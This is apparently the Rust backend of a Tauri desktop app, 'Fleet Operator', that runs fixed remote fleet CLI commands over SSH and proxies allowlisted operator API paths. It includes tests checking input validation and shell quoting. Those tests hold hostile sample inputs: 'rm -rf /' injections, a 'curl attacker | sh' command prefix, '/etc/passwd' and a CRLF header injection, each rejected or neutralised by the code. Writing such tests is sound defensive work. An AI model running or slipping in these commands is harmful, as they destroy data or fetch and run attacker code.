use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::{
    fs::{self, OpenOptions},
    net::TcpListener,
    path::{Path, PathBuf},
    process::{Child, Command, Output, Stdio},
    sync::Mutex,
    thread,
    time::{Duration, SystemTime, UNIX_EPOCH},
};
use tauri::{AppHandle, Manager, State};

const OUTPUT_TAIL_CHARS: usize = 8_000;

/// Mirrors the CLI's `--reason` cap (packages/runner cosign contract): enforce
/// it before dispatch so a too-long reason never costs an SSH round-trip.
const MAX_REASON_LENGTH: usize = 500;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
struct HostProfile {
    id: String,
    name: String,
    ssh_target: String,
    remote_repo_path: String,
    remote_command_prefix: String,
    remote_port: u16,
    preferred_local_port: Option<u16>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase", rename_all_fields = "camelCase", tag = "kind")]
enum FleetAction {
    Dispatch { task: String, repo: Option<String> },
    LocalRun { task: String, repo: String, pr: bool },
    CosignMerge { run_id: String },
    CosignClose { run_id: String, reason: String },
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct ConnectionStatus {
    profile_id: Option<String>,
    state: String,
    local_port: Option<u16>,
    url: Option<String>,
    command: Option<String>,
    exit_status: Option<i32>,
    output_tail: String,
    started_at: Option<u64>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct RemoteCommandResult {
    command: String,
    exit_status: i32,
    stdout_tail: String,
    stderr_tail: String,
    timestamp: u64,
}

#[derive(Default)]
struct OperatorState {
    session: Mutex<Option<SshSession>>,
}

struct SshSession {
    child: Child,
    profile_id: String,
    local_port: u16,
    command: String,
    log_path: PathBuf,
    started_at: u64,
}

impl Drop for SshSession {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

#[derive(Debug, PartialEq, Eq)]
struct CommandSpec {
    program: String,
    args: Vec<String>,
    display: String,
}

fn now_ms() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as u64
}

fn tail(value: &str) -> String {
    let chars: Vec<char> = value.chars().collect();
    chars[chars.len().saturating_sub(OUTPUT_TAIL_CHARS)..]
        .iter()
        .collect()
}

fn read_tail(path: &Path) -> String {
    fs::read_to_string(path)
        .map(|value| tail(&value))
        .unwrap_or_default()
}

fn valid_identifier(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 160
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
        && value != "."
        && value != ".."
}

fn validate_profile(profile: &HostProfile) -> Result<(), String> {
    if !valid_identifier(&profile.id) || profile.name.trim().is_empty() {
        return Err("profile id must be a safe identifier and name is required".into());
    }
    if profile.ssh_target.starts_with('-')
        || profile.ssh_target.is_empty()
        || !profile
            .ssh_target
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '@' | '-' | '_' | '.'))
    {
        return Err("SSH target must be a host alias or user@host".into());
    }
    if !profile.remote_repo_path.starts_with('/')
        || profile
            .remote_repo_path
            .chars()
            .any(|c| matches!(c, '\n' | '\r' | '\0'))
    {
        return Err("remote control repo path must be an absolute path".into());
    }
    if profile.remote_port == 0 {
        return Err("remote port must be between 1 and 65535".into());
    }
    let expected = command_prefix(&profile.remote_repo_path);
    if !profile.remote_command_prefix.is_empty() && profile.remote_command_prefix != expected {
        return Err(
            "remote command prefix is derived from the repo path and cannot be customized".into(),
        );
    }
    Ok(())
}

fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', "'\"'\"'"))
}

fn command_prefix(repo_path: &str) -> String {
    format!("cd -- {} && exec pnpm fleet", shell_quote(repo_path))
}

fn fleet_command(profile: &HostProfile, action: &FleetAction) -> Result<String, String> {
    validate_profile(profile)?;
    let prefix = command_prefix(&profile.remote_repo_path);
    let quoted = |value: &str, what: &str| -> Result<String, String> {
        if valid_identifier(value) {
            Ok(shell_quote(value))
        } else {
            Err(format!("{what} must be a fleet identifier"))
        }
    };
    match action {
        FleetAction::Dispatch { task, repo } => {
            let mut command = format!("{prefix} dispatch {}", quoted(task, "task")?);
            if let Some(repo) = repo {
                command.push_str(&format!(" --repo {}", quoted(repo, "repo")?));
            }
            Ok(command)
        }
        FleetAction::LocalRun { task, repo, pr } => Ok(format!(
            "{prefix} run {} --repo {} --local{}",
            quoted(task, "task")?,
            quoted(repo, "repo")?,
            if *pr { " --pr" } else { "" }
        )),
        // Fixed flag set — --merge --json, no --force by design: a refusal
        // from the runner's cosign gate is the product working.
        FleetAction::CosignMerge { run_id } => Ok(format!(
            "{prefix} cosign {} --merge --json",
            quoted(run_id, "run id")?
        )),
        // Same fixed shape as merge; the reason is the one free-text value
        // that crosses the SSH boundary — shell-quoted like every other value
        // and capped to the CLI's limit before dispatch.
        FleetAction::CosignClose { run_id, reason } => {
            let reason = reason.trim();
            if reason.is_empty() {
                return Err("a close reason is required — it lands as the PR comment".into());
            }
            if reason.chars().count() > MAX_REASON_LENGTH {
                return Err(format!(
                    "the close reason is capped at {MAX_REASON_LENGTH} characters"
                ));
            }
            Ok(format!(
                "{prefix} cosign {} --close --reason {} --json",
                quoted(run_id, "run id")?,
                shell_quote(reason)
            ))
        }
    }
}

fn connect_spec(profile: &HostProfile, local_port: u16) -> Result<CommandSpec, String> {
    validate_profile(profile)?;
    // --cosign: the serve polls GitHub PR merge state (via the runner's gh
    // auth) so the workbench can show open/merged/closed beside each shipped
    // run and refresh after a co-sign action. Still a fixed command — the
    // flag set is not caller-extensible.
    let remote = format!(
        "{} report --serve --port {} --cosign",
        command_prefix(&profile.remote_repo_path),
        profile.remote_port
    );
    let forward = format!("{local_port}:127.0.0.1:{}", profile.remote_port);
    let args = vec![
        "-o".into(),
        "BatchMode=yes".into(),
        "-o".into(),
        "ExitOnForwardFailure=yes".into(),
        "-L".into(),
        forward,
        profile.ssh_target.clone(),
        remote,
    ];
    Ok(CommandSpec {
        program: "ssh".into(),
        display: format!(
            "ssh {} [forward localhost:{local_port}] fleet report --serve --cosign",
            profile.ssh_target
        ),
        args,
    })
}

fn action_spec(profile: &HostProfile, action: &FleetAction) -> Result<CommandSpec, String> {
    let remote = fleet_command(profile, action)?;
    let action_display = match action {
        FleetAction::Dispatch { task, repo } => format!(
            "fleet dispatch {task}{}",
            repo.as_ref()
                .map(|repo| format!(" --repo {repo}"))
                .unwrap_or_default()
        ),
        FleetAction::LocalRun { task, repo, pr } => {
            format!(
                "fleet run {task} --repo {repo} --local{}",
                if *pr { " --pr" } else { "" }
            )
        }
        FleetAction::CosignMerge { run_id } => format!("fleet cosign {run_id} --merge"),
        // The reason stays out of the display — it can be 500 characters of
        // prose and it already lands verbatim on the PR.
        FleetAction::CosignClose { run_id, .. } => format!("fleet cosign {run_id} --close"),
    };
    Ok(CommandSpec {
        program: "ssh".into(),
        args: vec![
            "-o".into(),
            "BatchMode=yes".into(),
            profile.ssh_target.clone(),
            remote,
        ],
        display: format!("ssh {} {action_display}", profile.ssh_target),
    })
}

fn select_local_port(preferred: Option<u16>) -> Result<u16, String> {
    if let Some(port) = preferred.filter(|port| *port > 0) {
        if TcpListener::bind(("127.0.0.1", port)).is_ok() {
            return Ok(port);
        }
    }
    TcpListener::bind(("127.0.0.1", 0))
        .and_then(|listener| listener.local_addr())
        .map(|address| address.port())
        .map_err(|error| format!("no local port available: {error}"))
}

fn profiles_path(app: &AppHandle) -> Result<PathBuf, String> {
    app.path()
        .app_data_dir()
        .map(|dir| dir.join("profiles.json"))
        .map_err(|error| format!("app data directory unavailable: {error}"))
}

fn normalize_profile(mut profile: HostProfile) -> Result<HostProfile, String> {
    validate_profile(&profile)?;
    profile.name = profile.name.trim().to_string();
    profile.remote_command_prefix = command_prefix(&profile.remote_repo_path);
    Ok(profile)
}

#[tauri::command]
fn load_profiles(app: AppHandle) -> Result<Vec<HostProfile>, String> {
    let path = profiles_path(&app)?;
    if !path.exists() {
        return Ok(Vec::new());
    }
    let data = fs::read_to_string(&path)
        .map_err(|error| format!("profiles could not be read: {error}"))?;
    serde_json::from_str(&data).map_err(|error| format!("profiles are invalid: {error}"))
}

#[tauri::command]
fn save_profiles(app: AppHandle, profiles: Vec<HostProfile>) -> Result<Vec<HostProfile>, String> {
    let profiles = profiles
        .into_iter()
        .map(normalize_profile)
        .collect::<Result<Vec<_>, _>>()?;
    let path = profiles_path(&app)?;
    let parent = path
        .parent()
        .ok_or_else(|| "profile path has no parent".to_string())?;
    fs::create_dir_all(parent)
        .map_err(|error| format!("profile directory could not be created: {error}"))?;
    let tmp = path.with_extension("json.tmp");
    fs::write(
        &tmp,
        serde_json::to_vec_pretty(&profiles).map_err(|error| error.to_string())?,
    )
    .map_err(|error| format!("profiles could not be saved: {error}"))?;
    fs::rename(&tmp, &path).map_err(|error| format!("profiles could not be saved: {error}"))?;
    Ok(profiles)
}

fn stop_session(session: &mut SshSession) {
    let _ = session.child.kill();
    let _ = session.child.wait();
}

fn replace_session(slot: &mut Option<SshSession>, next: SshSession) {
    if let Some(mut existing) = slot.take() {
        stop_session(&mut existing);
    }
    *slot = Some(next);
}

#[tauri::command]
fn connect_profile(
    app: AppHandle,
    state: State<'_, OperatorState>,
    profile: HostProfile,
) -> Result<ConnectionStatus, String> {
    let profile = normalize_profile(profile)?;
    let port = select_local_port(profile.preferred_local_port)?;
    let spec = connect_spec(&profile, port)?;
    let log_dir = app
        .path()
        .app_log_dir()
        .map_err(|error| format!("log directory unavailable: {error}"))?;
    fs::create_dir_all(&log_dir)
        .map_err(|error| format!("log directory could not be created: {error}"))?;
    let log_path = log_dir.join(format!("ssh-{}.log", profile.id));
    let stdout = OpenOptions::new()
        .create(true)
        .truncate(true)
        .write(true)
        .open(&log_path)
        .map_err(|error| format!("SSH log could not be opened: {error}"))?;
    let stderr = stdout
        .try_clone()
        .map_err(|error| format!("SSH log could not be cloned: {error}"))?;

    let mut guard = state
        .session
        .lock()
        .map_err(|_| "connection state is unavailable".to_string())?;
    let child = Command::new(&spec.program)
        .args(&spec.args)
        .stdin(Stdio::null())
        .stdout(Stdio::from(stdout))
        .stderr(Stdio::from(stderr))
        .spawn()
        .map_err(|error| format!("SSH could not start: {error}"))?;
    replace_session(
        &mut guard,
        SshSession {
            child,
            profile_id: profile.id,
            local_port: port,
            command: spec.display,
            log_path,
            started_at: now_ms(),
        },
    );
    drop(guard);
    thread::sleep(Duration::from_millis(200));
    connection_status(state)
}

#[tauri::command]
fn disconnect(state: State<'_, OperatorState>) -> Result<ConnectionStatus, String> {
    let mut guard = state
        .session
        .lock()
        .map_err(|_| "connection state is unavailable".to_string())?;
    if let Some(mut session) = guard.take() {
        stop_session(&mut session);
    }
    Ok(disconnected_status())
}

fn disconnected_status() -> ConnectionStatus {
    ConnectionStatus {
        profile_id: None,
        state: "disconnected".into(),
        local_port: None,
        url: None,
        command: None,
        exit_status: None,
        output_tail: String::new(),
        started_at: None,
    }
}

#[tauri::command]
fn connection_status(state: State<'_, OperatorState>) -> Result<ConnectionStatus, String> {
    let mut guard = state
        .session
        .lock()
        .map_err(|_| "connection state is unavailable".to_string())?;
    let Some(session) = guard.as_mut() else {
        return Ok(disconnected_status());
    };
    let exit = session
        .child
        .try_wait()
        .map_err(|error| format!("SSH status unavailable: {error}"))?;
    Ok(ConnectionStatus {
        profile_id: Some(session.profile_id.clone()),
        state: if exit.is_some() {
            "stale".into()
        } else {
            "connected".into()
        },
        local_port: Some(session.local_port),
        url: Some(format!("http://127.0.0.1:{}", session.local_port)),
        command: Some(session.command.clone()),
        exit_status: exit.and_then(|status| status.code()),
        output_tail: read_tail(&session.log_path),
        started_at: Some(session.started_at),
    })
}

fn command_result(spec: CommandSpec, output: Output) -> RemoteCommandResult {
    RemoteCommandResult {
        command: spec.display,
        exit_status: output.status.code().unwrap_or(-1),
        stdout_tail: tail(&String::from_utf8_lossy(&output.stdout)),
        stderr_tail: tail(&String::from_utf8_lossy(&output.stderr)),
        timestamp: now_ms(),
    }
}

#[tauri::command]
async fn execute_fleet_action(
    profile: HostProfile,
    action: FleetAction,
) -> Result<RemoteCommandResult, String> {
    let profile = normalize_profile(profile)?;
    let spec = action_spec(&profile, &action)?;
    tauri::async_runtime::spawn_blocking(move || {
        let output = Command::new(&spec.program)
            .args(&spec.args)
            .stdin(Stdio::null())
            .output()
            .map_err(|error| format!("SSH command failed to start: {error}"))?;
        Ok(command_result(spec, output))
    })
    .await
    .map_err(|error| format!("SSH command task failed: {error}"))?
}

fn validate_operator_path(path: &str) -> Result<(), String> {
    if !path.starts_with("/api/")
        || path.contains("://")
        || path.chars().any(|c| matches!(c, '\n' | '\r'))
    {
        return Err("only operator API paths are allowed".into());
    }
    Ok(())
}

async fn operator_response(
    state: &OperatorState,
    path: &str,
) -> Result<reqwest::Response, String> {
    validate_operator_path(path)?;
    let port = {
        let mut guard = state
            .session
            .lock()
            .map_err(|_| "connection state is unavailable".to_string())?;
        let session = guard.as_mut().ok_or_else(|| "not connected".to_string())?;
        if session
            .child
            .try_wait()
            .map_err(|error| error.to_string())?
            .is_some()
        {
            return Err("connection is stale".into());
        }
        session.local_port
    };
    let response = reqwest::get(format!("http://127.0.0.1:{port}{path}"))
        .await
        .map_err(|error| format!("operator API unavailable: {error}"))?;
    let status = response.status();
    if !status.is_success() {
        return Err(format!("operator API returned {status}"));
    }
    Ok(response)
}

#[tauri::command]
async fn operator_get(state: State<'_, OperatorState>, path: String) -> Result<Value, String> {
    operator_response(state.inner(), &path)
        .await?
        .json::<Value>()
        .await
        .map_err(|error| format!("operator API returned invalid JSON: {error}"))
}

/// Raw-text sibling of `operator_get` for non-JSON artifacts (diff.patch) —
/// same allowlisted-path guard, same forwarded loopback port.
#[tauri::command]
async fn operator_get_text(state: State<'_, OperatorState>, path: String) -> Result<String, String> {
    operator_response(state.inner(), &path)
        .await?
        .text()
        .await
        .map_err(|error| format!("operator API returned unreadable text: {error}"))
}

pub fn run() {
    tauri::Builder::default()
        .manage(OperatorState::default())
        .invoke_handler(tauri::generate_handler![
            load_profiles,
            save_profiles,
            connect_profile,
            disconnect,
            connection_status,
            execute_fleet_action,
            operator_get,
            operator_get_text
        ])
        .run(tauri::generate_context!())
        .expect("error while running Fleet Operator");
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_session(profile_id: &str, script: &str) -> SshSession {
        SshSession {
            child: Command::new("sh").args(["-c", script]).spawn().unwrap(),
            profile_id: profile_id.into(),
            local_port: 49152,
            command: "ssh runner fleet report --serve".into(),
            log_path: std::env::temp_dir().join(format!("fleet-operator-{profile_id}.log")),
            started_at: now_ms(),
        }
    }

    fn profile() -> HostProfile {
        HostProfile {
            id: "prod".into(),
            name: "Production runner".into(),
            ssh_target: "fleet@example.test".into(),
            remote_repo_path: "/srv/fleet control".into(),
            remote_command_prefix: String::new(),
            remote_port: 4173,
            preferred_local_port: Some(4173),
        }
    }

    #[test]
    fn dispatch_command_is_allowlisted_and_quotes_values() {
        let command = fleet_command(
            &profile(),
            &FleetAction::Dispatch {
                task: "007-api".into(),
                repo: Some("demo-api".into()),
            },
        )
        .unwrap();
        assert_eq!(
            command,
            "cd -- '/srv/fleet control' && exec pnpm fleet dispatch '007-api' --repo 'demo-api'"
        );
        assert!(fleet_command(
            &profile(),
            &FleetAction::Dispatch {
                task: "task; rm -rf /".into(),
                repo: None
            },
        )
        .is_err());
    }

    #[test]
    fn local_run_without_pr_has_only_the_fixed_local_flag() {
        assert_eq!(
            fleet_command(
                &profile(),
                &FleetAction::LocalRun {
                    task: "007-api".into(),
                    repo: "demo-api".into(),
                    pr: false,
                },
            )
            .unwrap(),
            "cd -- '/srv/fleet control' && exec pnpm fleet run '007-api' --repo 'demo-api' --local"
        );
    }

    #[test]
    fn local_run_with_pr_appends_only_the_fixed_pr_flag() {
        assert_eq!(
            fleet_command(
                &profile(),
                &FleetAction::LocalRun {
                    task: "007-api".into(),
                    repo: "demo-api".into(),
                    pr: true,
                },
            )
            .unwrap(),
            "cd -- '/srv/fleet control' && exec pnpm fleet run '007-api' --repo 'demo-api' --local --pr"
        );
        // The flag is a bool on a fixed spec — the only free values stay the
        // identifier-validated task and repo.
        assert!(fleet_command(
            &profile(),
            &FleetAction::LocalRun {
                task: "007-api".into(),
                repo: "demo-api'; rm -rf /".into(),
                pr: true,
            },
        )
        .is_err());
    }

    #[test]
    fn local_run_receipt_names_the_pr_flag_when_set() {
        let action = |pr| FleetAction::LocalRun {
            task: "007-api".into(),
            repo: "demo-api".into(),
            pr,
        };
        assert_eq!(
            action_spec(&profile(), &action(true)).unwrap().display,
            "ssh fleet@example.test fleet run 007-api --repo demo-api --local --pr"
        );
        assert_eq!(
            action_spec(&profile(), &action(false)).unwrap().display,
            "ssh fleet@example.test fleet run 007-api --repo demo-api --local"
        );
    }

    #[test]
    fn cosign_merge_command_is_fixed_and_validates_run_id() {
        let command = fleet_command(
            &profile(),
            &FleetAction::CosignMerge {
                run_id: "eacac4d4-56d8-4420-b923-9d7ec886d983".into(),
            },
        )
        .unwrap();
        // The whole flag set is fixed — --merge --json, no --force. The runId
        // is the only free value and it is identifier-validated like task and
        // repo: no arbitrary shell ever rides a cosign.
        assert_eq!(
            command,
            "cd -- '/srv/fleet control' && exec pnpm fleet cosign 'eacac4d4-56d8-4420-b923-9d7ec886d983' --merge --json"
        );
        for bad in ["run'; rm -rf /", "", "run id", ".."] {
            assert!(fleet_command(
                &profile(),
                &FleetAction::CosignMerge { run_id: bad.into() },
            )
            .is_err());
        }
    }

    #[test]
    fn fleet_actions_deserialize_the_apps_camel_case_payloads() {
        // main.ts sends camelCase keys (runId); the enum must accept them or
        // every cosign invoke dies at the deserialization boundary.
        let merge: FleetAction = serde_json::from_str(r#"{"kind":"cosignMerge","runId":"abc-123"}"#)
            .expect("cosignMerge payload from main.ts must deserialize");
        assert!(matches!(merge, FleetAction::CosignMerge { run_id } if run_id == "abc-123"));
        let close: FleetAction =
            serde_json::from_str(r#"{"kind":"cosignClose","runId":"abc-123","reason":"stale approach"}"#)
                .expect("cosignClose payload from main.ts must deserialize");
        assert!(
            matches!(close, FleetAction::CosignClose { run_id, reason } if run_id == "abc-123" && reason == "stale approach")
        );
    }

    #[test]
    fn cosign_close_command_is_fixed_and_shell_quotes_the_reason() {
        // The reason is the one free-text value that crosses the SSH boundary:
        // shell-quoted like every existing value, never interpolated raw.
        let command = fleet_command(
            &profile(),
            &FleetAction::CosignClose {
                run_id: "eacac4d4-56d8-4420-b923-9d7ec886d983".into(),
                reason: "judge missed it: doesn't handle empty feeds".into(),
            },
        )
        .unwrap();
        assert_eq!(
            command,
            "cd -- '/srv/fleet control' && exec pnpm fleet cosign 'eacac4d4-56d8-4420-b923-9d7ec886d983' --close --reason 'judge missed it: doesn'\"'\"'t handle empty feeds' --json"
        );
        // A hostile reason rides inside the quotes as inert text — the quote
        // escape keeps `'; rm -rf /` from ever reaching the shell unquoted.
        let hostile = fleet_command(
            &profile(),
            &FleetAction::CosignClose {
                run_id: "abc-123".into(),
                reason: "'; rm -rf / #".into(),
            },
        )
        .unwrap();
        assert_eq!(
            hostile,
            "cd -- '/srv/fleet control' && exec pnpm fleet cosign 'abc-123' --close --reason ''\"'\"'; rm -rf / #' --json"
        );
        // The runId stays identifier-validated like task and repo.
        assert!(fleet_command(
            &profile(),
            &FleetAction::CosignClose {
                run_id: "run'; rm -rf /".into(),
                reason: "why".into(),
            },
        )
        .is_err());
    }

    #[test]
    fn cosign_close_reason_cap_and_presence_are_enforced_before_dispatch() {
        let close = |reason: &str| {
            fleet_command(
                &profile(),
                &FleetAction::CosignClose {
                    run_id: "abc-123".into(),
                    reason: reason.into(),
                },
            )
        };
        // The CLI caps --reason at 500 characters; the app must refuse before
        // dispatch, not learn it from a remote error after the SSH round-trip.
        assert!(close(&"x".repeat(500)).is_ok());
        assert!(close(&"x".repeat(501)).is_err());
        assert!(close("").is_err());
        assert!(close("   \n  ").is_err());
        // The cap counts characters like the CLI does, not bytes.
        assert!(close(&"é".repeat(500)).is_ok());
    }

    #[test]
    fn cosign_close_receipt_names_the_fixed_command_without_the_reason() {
        // The reason can be 500 characters of prose — the receipt title names
        // the fixed command; the full reason lands on the PR, not in the title.
        let spec = action_spec(
            &profile(),
            &FleetAction::CosignClose {
                run_id: "abc-123".into(),
                reason: "superseded by a better run".into(),
            },
        )
        .unwrap();
        assert_eq!(spec.program, "ssh");
        assert_eq!(spec.display, "ssh fleet@example.test fleet cosign abc-123 --close");
    }

    #[test]
    fn cosign_merge_receipt_names_the_fixed_command() {
        let spec = action_spec(
            &profile(),
            &FleetAction::CosignMerge {
                run_id: "abc-123".into(),
            },
        )
        .unwrap();
        assert_eq!(spec.program, "ssh");
        assert_eq!(spec.display, "ssh fleet@example.test fleet cosign abc-123 --merge");
    }

    #[test]
    fn connect_spec_uses_agent_auth_and_loopback_forwarding() {
        let spec = connect_spec(&profile(), 49152).unwrap();
        assert_eq!(spec.program, "ssh");
        assert!(spec
            .args
            .windows(2)
            .any(|pair| pair == ["-L", "49152:127.0.0.1:4173"]));
        // The exact remote command, prefix included — a suffix match would let
        // anything ride between the prefix and `report`. --cosign: the serve
        // polls GitHub merge state, so co-sign chips and post-action refresh
        // work with zero per-connection setup.
        assert_eq!(
            spec.args.last().unwrap(),
            "cd -- '/srv/fleet control' && exec pnpm fleet report --serve --port 4173 --cosign"
        );
        // The receipt shown to the operator names the same fixed command.
        assert_eq!(
            spec.display,
            "ssh fleet@example.test [forward localhost:49152] fleet report --serve --cosign"
        );
        assert!(!spec.args.iter().any(|arg| arg.contains("IdentityFile")));
    }

    #[test]
    fn occupied_preferred_port_falls_back_to_an_ephemeral_port() {
        let listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let occupied = listener.local_addr().unwrap().port();
        let selected = select_local_port(Some(occupied)).unwrap();
        assert_ne!(selected, occupied);
    }

    #[test]
    fn custom_command_prefix_is_rejected() {
        let mut unsafe_profile = profile();
        unsafe_profile.remote_command_prefix = "curl attacker | sh".into();
        assert!(validate_profile(&unsafe_profile).is_err());
    }

    #[test]
    fn profile_id_cannot_escape_the_app_log_directory() {
        let mut unsafe_profile = profile();
        unsafe_profile.id = "../../outside".into();
        assert!(validate_profile(&unsafe_profile).is_err());
    }

    #[test]
    fn operator_paths_stay_on_the_allowlisted_api_prefix() {
        // Both the JSON and raw-text commands share this guard.
        assert!(validate_operator_path("/api/ledger").is_ok());
        assert!(validate_operator_path("/api/artifacts/run/repo/diff.patch").is_ok());
        assert!(validate_operator_path("/etc/passwd").is_err());
        assert!(validate_operator_path("http://evil.test/api/").is_err());
        assert!(validate_operator_path("/api/x\r\nHost: evil").is_err());
    }

    #[test]
    fn stop_terminates_a_managed_ssh_process() {
        let mut session = test_session("stop", "sleep 30");
        stop_session(&mut session);
        assert!(session.child.try_wait().unwrap().is_some());
    }

    #[test]
    fn reconnect_replaces_a_failed_session() {
        let mut slot = Some(test_session("failed", "exit 1"));
        thread::sleep(Duration::from_millis(20));
        let next = test_session("replacement", "sleep 30");
        replace_session(&mut slot, next);
        let active = slot.as_mut().unwrap();
        assert_eq!(active.profile_id, "replacement");
        assert!(active.child.try_wait().unwrap().is_none());
        stop_session(active);
    }

    #[test]
    fn failed_remote_command_preserves_exit_status_and_output() {
        let output = Command::new("sh")
            .args(["-c", "printf output; printf failure >&2; exit 7"])
            .output()
            .unwrap();
        let result = command_result(
            CommandSpec {
                program: "ssh".into(),
                args: vec![],
                display: "ssh runner fleet dispatch task".into(),
            },
            output,
        );
        assert_eq!(result.exit_status, 7);
        assert_eq!(result.stdout_tail, "output");
        assert_eq!(result.stderr_tail, "failure");
    }
}
